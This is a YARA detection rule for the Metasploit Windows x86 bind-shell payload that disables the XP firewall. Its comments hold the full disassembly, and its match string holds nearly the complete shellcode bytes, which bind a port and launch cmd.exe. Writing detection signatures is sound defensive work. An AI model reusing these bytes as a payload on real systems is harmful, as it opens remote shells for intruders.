
    rule single_shell_bind_tcp_xpfw___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::single_shell_bind_tcp_xpfw::__start0__"
    
        /*
            E856000000           | .V...                | call 0x5b
            53                   | S                    | push ebx
            55                   | U                    | push ebp
            56                   | V                    | push esi
            57                   | W                    | push edi
            8B6C2418             | .l$.                 | mov ebp,[esp+0x18]
            8B453C               | .E<                  | mov eax,[ebp+0x3c]
            8B540578             | .T.x                 | mov edx,[ebp+eax+0x78]
            01EA                 | ..                   | add edx,ebp
            8B4A18               | .J.                  | mov ecx,[edx+0x18]
            8B5A20               | .Z                   | mov ebx,[edx+0x20]
            01EB                 | ..                   | add ebx,ebp
            E332                 | .2                   | jecxz 0x52
            49                   | I                    | dec ecx
            8B348B               | .4.                  | mov esi,[ebx+ecx*4]
            01EE                 | ..                   | add esi,ebp
            31FF                 | 1.                   | xor edi,edi
            FC                   | .                    | cld
            31C0                 | 1.                   | xor eax,eax
            AC                   | .                    | lodsb
            38E0                 | 8.                   | cmp al,ah
            0F8403000000         | ......               | jz 0x37
            C1CF0D               | ...                  | ror edi,0xd
            01C7                 | ..                   | add edi,eax
            EBEE                 | ..                   | jmp short 0x29
            3B7C2414             | ;|$.                 | cmp edi,[esp+0x14]
            0F85D9FFFFFF         | ......               | jnz 0x1e
            8B5A24               | .Z$                  | mov ebx,[edx+0x24]
            01EB                 | ..                   | add ebx,ebp
            668B0C4B             | f..K                 | mov cx,[ebx+ecx*2]
            8B5A1C               | .Z.                  | mov ebx,[edx+0x1c]
            01EB                 | ..                   | add ebx,ebp
            8B048B               | ...                  | mov eax,[ebx+ecx*4]
            01E8                 | ..                   | add eax,ebp
            EBFA                 | ..                   | jmp short 0x54
            31C0                 | 1.                   | xor eax,eax
            5F                   | _                    | pop edi
            5E                   | ^                    | pop esi
            5D                   | ]                    | pop ebp
            5B                   | [                    | pop ebx
            C20800               | ...                  | ret 0x8
            5E                   | ^                    | pop esi
            6A30                 | j0                   | push byte +0x30
            59                   | Y                    | pop ecx
            648B19               | d..                  | mov ebx,[fs:ecx]
            8B5B0C               | .[.                  | mov ebx,[ebx+0xc]
            8B5B1C               | .[.                  | mov ebx,[ebx+0x1c]
            8B1B                 | ..                   | mov ebx,[ebx]
            8B5B08               | .[.                  | mov ebx,[ebx+0x8]
            53                   | S                    | push ebx
            688E4E0EEC           | h.N..                | push dword 0xec0e4e8e
            FFD6                 | ..                   | call esi
            89C7                 | ..                   | mov edi,eax
            81EC00010000         | ......               | sub esp,0x100
            57                   | W                    | push edi
            56                   | V                    | push esi
            53                   | S                    | push ebx
            89E5                 | ..                   | mov ebp,esp
            E81F000000           | .....                | call 0xae
            90                   | .                    | nop
            0100                 | ..                   | add [eax],eax
            00B61918E7A4         | ......               | add [esi+0xa4e71819],dh
            1970E9               | .p.                  | sbb [eax-0x17],esi
            E549                 | .I                   | in eax,0x49
            8649A4               | .I.                  | xchg cl,[ecx-0x5c]
            1A70C7               | .p.                  | sbb dh,[eax-0x39]
            A4                   | .                    | movsb
            AD                   | .                    | lodsd
            2EE9D109F5AD         | ......               | cs jmp 0xadf50a7c
            CB                   | .                    | retf
            ED                   | .                    | in eax,dx
            FC                   | .                    | cld
            3B5753               | ;WS                  | cmp edx,[edi+0x53]
            325F33               | 2_3                  | xor bl,[edi+0x33]
            3200                 | 2.                   | xor al,[eax]
            5B                   | [                    | pop ebx
            8D4B20               | .K                   | lea ecx,[ebx+0x20]
            51                   | Q                    | push ecx
            FFD7                 | ..                   | call edi
            89DF                 | ..                   | mov edi,ebx
            89C3                 | ..                   | mov ebx,eax
            8D7514               | .u.                  | lea esi,[ebp+0x14]
            6A07                 | j.                   | push byte +0x7
            59                   | Y                    | pop ecx
            51                   | Q                    | push ecx
            53                   | S                    | push ebx
            FF348F               | .4.                  | push dword [edi+ecx*4]
            FF5504               | .U.                  | call near [ebp+0x4]
            59                   | Y                    | pop ecx
            89048E               | ...                  | mov [esi+ecx*4],eax
            E2EA                 | ..                   | loop 0xbf
            2B27                 | +'                   | sub esp,[edi]
            54                   | T                    | push esp
            FF37                 | .7                   | push dword [edi]
            FF5530               | .U0                  | call near [ebp+0x30]
            31C0                 | 1.                   | xor eax,eax
            50                   | P                    | push eax
            50                   | P                    | push eax
            50                   | P                    | push eax
            50                   | P                    | push eax
            40                   | @                    | inc eax
            50                   | P                    | push eax
            40                   | @                    | inc eax
            50                   | P                    | push eax
            FF552C               | .U,                  | call near [ebp+0x2c]
            89C7                 | ..                   | mov edi,eax
            897D0C               | .}.                  | mov [ebp+0xc],edi
            E8FEFFFFFF           | .....                | call 0xf2
            4F                   | O                    | dec edi
            4C                   | L                    | dec esp
            45                   | E                    | inc ebp
            3332                 | 32                   | xor esi,[edx]
            00FF                 | ..                   | add bh,bh
            55                   | U                    | push ebp
            0889C656681B         | ...Vh.               | or [ecx+0x1b6856c6],cl
            06                   | .                    | push es
            C80DFF55             | ...U                 | enter 0xff0d,0x55
            046A                 | .j                   | add al,0x6a
            022A                 | .*                   | add ch,[edx+0x0]
            FFD0                 | ..                   | call eax
            56                   | V                    | push esi
            6880C8266E           | h..&n                | push dword 0x6e26c880
            FF5504               | .U.                  | call near [ebp+0x4]
            89C7                 | ..                   | mov edi,eax
            E819000000           | .....                | call 0x136
            F5                   | .                    | cmc
            8A89F7C4CA32         | .....2               | mov cl,[ecx+0x32cac4f7]
            46                   | F                    | inc esi
            A2ECDA06E5           | .....                | mov [0xe506daec],al
            111A                 | ..                   | adc [edx],ebx
            F242                 | .B                   | repne inc edx
            E94530396E           | .E09n                | jmp 0x6e393178
            D84094               | .@.                  | fadd dword [eax-0x6c]
            3AB913C40C9C         | :.....               | cmp bh,[ecx+0x9c0cc413]
            D458                 | .X                   | aam 0x58
            50                   | P                    | push eax
            8D75EC               | .u.                  | lea esi,[ebp-0x14]
            56                   | V                    | push esi
            50                   | P                    | push eax
            6A01                 | j.                   | push byte +0x1
            6A00                 | j.                   | push byte +0x0
            83C010               | ...                  | add eax,byte +0x10
            50                   | P                    | push eax
            FFD7                 | ..                   | call edi
            8D4DE0               | .M.                  | lea ecx,[ebp-0x20]
            51                   | Q                    | push ecx
            8B55EC               | .U.                  | mov edx,[ebp-0x14]
            8B02                 | ..                   | mov eax,[edx]
            8B4DEC               | .M.                  | mov ecx,[ebp-0x14]
            51                   | Q                    | push ecx
            8B501C               | .P.                  | mov edx,[eax+0x1c]
            FFD2                 | ..                   | call edx
            8D45F8               | .E.                  | lea eax,[ebp-0x8]
            50                   | P                    | push eax
            8B4DE0               | .M.                  | mov ecx,[ebp-0x20]
            8B11                 | ..                   | mov edx,[ecx]
            8B45E0               | .E.                  | mov eax,[ebp-0x20]
            50                   | P                    | push eax
            8B4A1C               | .J.                  | mov ecx,[edx+0x1c]
            FFD1                 | ..                   | call ecx
            31C0                 | 1.                   | xor eax,eax
            50                   | P                    | push eax
            8B55F8               | .U.                  | mov edx,[ebp-0x8]
            8B02                 | ..                   | mov eax,[edx]
            8B4DF8               | .M.                  | mov ecx,[ebp-0x8]
            51                   | Q                    | push ecx
            8B5024               | .P$                  | mov edx,[eax+0x24]
            FFD2                 | ..                   | call edx
            31DB                 | 1.                   | xor ebx,ebx
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            680200????           | h...\                | push dword 0x5c110002	; Port
            89E0                 | ..                   | mov eax,esp
            6A10                 | j.                   | push byte +0x10
            50                   | P                    | push eax
            8B7D0C               | .}.                  | mov edi,[ebp+0xc]
            57                   | W                    | push edi
            FF5524               | .U$                  | call near [ebp+0x24]
            53                   | S                    | push ebx
            57                   | W                    | push edi
            FF5528               | .U(                  | call near [ebp+0x28]
            53                   | S                    | push ebx
            54                   | T                    | push esp
            57                   | W                    | push edi
            FF5520               | .U                   | call near [ebp+0x20]
            89C7                 | ..                   | mov edi,eax
            68434D4400           | hCMD.                | push dword 0x444d43
            89E3                 | ..                   | mov ebx,esp
            87FA                 | ..                   | xchg edi,edx
            31C0                 | 1.                   | xor eax,eax
            8D7C24AC             | .|$.                 | lea edi,[esp-0x54]
            6A15                 | j.                   | push byte +0x15
            59                   | Y                    | pop ecx
            F3AB                 | ..                   | rep stosd
            87FA                 | ..                   | xchg edi,edx
            83EC54               | ..T                  | sub esp,byte +0x54
            C644241044           | .D$.D                | mov byte [esp+0x10],0x44
            66C744243C0101       | f.D$<..              | mov word [esp+0x3c],0x101
            897C2448             | .|$H                 | mov [esp+0x48],edi
            897C244C             | .|$L                 | mov [esp+0x4c],edi
            897C2450             | .|$P                 | mov [esp+0x50],edi
            8D442410             | .D$.                 | lea eax,[esp+0x10]
            54                   | T                    | push esp
            50                   | P                    | push eax
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            41                   | A                    | inc ecx
            51                   | Q                    | push ecx
            49                   | I                    | dec ecx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            53                   | S                    | push ebx
            51                   | Q                    | push ecx
            FF7500               | .u.                  | push dword [ebp+0x0]
            6872FEB316           | hr...                | push dword 0x16b3fe72
            FF5504               | .U.                  | call near [ebp+0x4]
            FFD0                 | ..                   | call eax
            89E6                 | ..                   | mov esi,esp
            FF7500               | .u.                  | push dword [ebp+0x0]
            68ADD905CE           | h....                | push dword 0xce05d9ad
            FF5504               | .U.                  | call near [ebp+0x4]
            89C3                 | ..                   | mov ebx,eax
            6AFF                 | j.                   | push byte -0x1
            FF36                 | .6                   | push dword [esi]
            FFD3                 | ..                   | call ebx
            FF7500               | .u.                  | push dword [ebp+0x0]
            68F08A045F           | h..._                | push dword 0x5f048af0
            FF5504               | .U.                  | call near [ebp+0x4]
            31DB                 | 1.                   | xor ebx,ebx
            53                   | S                    | push ebx
            FFD0                 | ..                   | call eax
        */
    
        strings:
            $a   = { e8 56 00 00 00 53 55 56 57 8b 6c 24 18 8b 45 3c 8b 54 05 78 01 ea 8b 4a 18 8b 5a 20 01 eb e3 32 49 8b 34 8b 01 ee 31 ff fc 31 c0 ac 38 e0 0f 84 03 00 00 00 c1 cf 0d 01 c7 eb ee 3b 7c 24 14 0f 85 d9 ff ff ff 8b 5a 24 01 eb 66 8b 0c 4b 8b 5a 1c 01 eb 8b 04 8b 01 e8 eb fa 31 c0 5f 5e 5d 5b c2 08 00 5e 6a 30 59 64 8b 19 8b 5b 0c 8b 5b 1c 8b 1b 8b 5b 08 53 68 8e 4e 0e ec ff d6 89 c7 81 ec 00 01 00 00 57 56 53 89 e5 e8 1f 00 00 00 90 01 00 00 b6 19 18 e7 a4 19 70 e9 e5 49 86 49 a4 1a 70 c7 a4 ad 2e e9 d1 09 f5 ad cb ed fc 3b 57 53 32 5f 33 32 00 5b 8d 4b 20 51 ff d7 89 df 89 c3 8d 75 14 6a 07 59 51 53 ff 34 8f ff 55 04 59 89 04 8e e2 ea 2b 27 54 ff 37 ff 55 30 31 c0 50 50 50 50 40 50 40 50 ff 55 2c 89 c7 89 7d 0c e8 fe ff ff ff 4f 4c 45 33 32 00 ff 55 08 89 c6 56 68 1b 06 c8 0d ff 55 04 6a 02 2a ff d0 56 68 80 c8 26 6e ff 55 04 89 c7 e8 19 00 00 00 f5 8a 89 f7 c4 ca 32 46 a2 ec da 06 e5 11 1a f2 42 e9 45 30 39 6e d8 40 94 3a b9 13 c4 0c 9c d4 58 50 8d 75 ec 56 50 6a 01 6a 00 83 c0 10 50 ff d7 8d 4d e0 51 8b 55 ec 8b 02 8b 4d ec 51 8b 50 1c ff d2 8d 45 f8 50 8b 4d e0 8b 11 8b 45 e0 50 8b 4a 1c ff d1 31 c0 50 8b 55 f8 8b 02 8b 4d f8 51 8b 50 24 ff d2 31 db 53 53 68 02 00 ?? ?? 89 e0 6a 10 50 8b 7d 0c 57 ff 55 24 53 57 ff 55 28 53 54 57 ff 55 20 89 c7 68 43 4d 44 00 89 e3 87 fa 31 c0 8d 7c 24 ac 6a 15 59 f3 ab 87 fa 83 ec 54 c6 44 24 10 44 66 c7 44 24 3c 01 01 89 7c 24 48 89 7c 24 4c 89 7c 24 50 8d 44 24 10 54 50 51 51 51 41 51 49 51 51 53 51 ff 75 00 68 72 fe b3 16 ff 55 04 ff d0 89 e6 ff 75 00 68 ad d9 05 ce ff 55 04 89 c3 6a ff ff 36 ff d3 ff 75 00 68 f0 8a 04 5f ff 55 04 31 db 53 ff d0 }
    
        condition:
            any of them
    }
    
    